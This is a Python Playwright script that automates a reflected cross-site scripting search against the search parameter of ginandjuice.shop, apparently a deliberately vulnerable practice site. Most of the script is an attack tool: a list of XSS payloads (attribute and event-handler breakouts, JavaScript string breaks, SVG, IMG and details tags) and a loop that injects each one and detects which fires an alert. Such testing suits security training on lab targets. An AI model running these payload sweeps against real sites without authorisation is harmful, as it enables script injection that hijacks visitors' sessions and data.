#!/usr/bin/env python3
"""
Find the REAL XSS vector on ginandjuice.shop
Testing different injection contexts
"""
import asyncio
from playwright.async_api import async_playwright

async def find_xss_vector():
    """Try different XSS vectors"""
    
    # Since HTML tags are blocked, let's try:
    # 1. Event handlers in existing elements
    # 2. Breaking out of JavaScript context
    # 3. Special characters that might not be sanitized
    
    test_vectors = [
        # Event handler injection
        ('test" onload="alert(1)', "Event handler in attribute"),
        ('test" onfocus="alert(1)" autofocus="', "Onfocus with autofocus"),
        ('test" onerror="alert(1)', "Onerror handler"),
        
        # JavaScript context break
        ("test';alert(1);//", "JS string break with semicolon"),
        ("test\";alert(1);//", "JS string break with double quote"),
        ("test</script><script>alert(1)</script>", "Script tag break"),
        
        # Special payloads
        ("test'><svg/onload=alert(1)>", "SVG onload"),
        ("test\"><img src=x onerror=alert(1)>", "IMG onerror"),
        ("test'><details open ontoggle=alert(1)>", "Details ontoggle"),
        
        # Without HTML tags - pure JS injection
        ("test';alert(document.domain);//", "Pure JS injection"),
        ("test'+alert(1)+'", "JS concatenation"),
    ]
    
    print("=" * 70)
    print("🔍 SEARCHING FOR WORKING XSS VECTOR")
    print("=" * 70)
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        page = await browser.new_page()
        
        alert_triggered = []
        
        def handle_dialog(dialog):
            alert_triggered.append(dialog.message)
            asyncio.create_task(dialog.dismiss())
        
        page.on('dialog', handle_dialog)
        
        for payload, description in test_vectors:
            url = f"https://ginandjuice.shop/catalog?searchTerm={payload}"
            
            print(f"\n[{description}]")
            print(f"  Payload: {payload}")
            
            alert_triggered.clear()
            
            try:
                await page.goto(url, wait_until='load', timeout=5000)
                await asyncio.sleep(1)
                
                if alert_triggered:
                    print(f"  Result: ✅ ALERT TRIGGERED! Message: {alert_triggered[0]}")
                    print(f"\n{'='*70}")
                    print(f"🎉 FOUND WORKING PAYLOAD!")
                    print(f"{'='*70}")
                    print(f"Payload: {payload}")
                    print(f"URL: {url}")
                    break
                else:
                    # Check if payload is in page source
                    content = await page.content()
                    if payload in content:
                        print(f"  Result: ⚠️  Reflected but no alert")
                    else:
                        print(f"  Result: ❌ Not reflected")
            except Exception as e:
                print(f"  Result: ❌ Error: {str(e)[:50]}")
        
        await browser.close()

if __name__ == "__main__":
    asyncio.run(find_xss_vector())
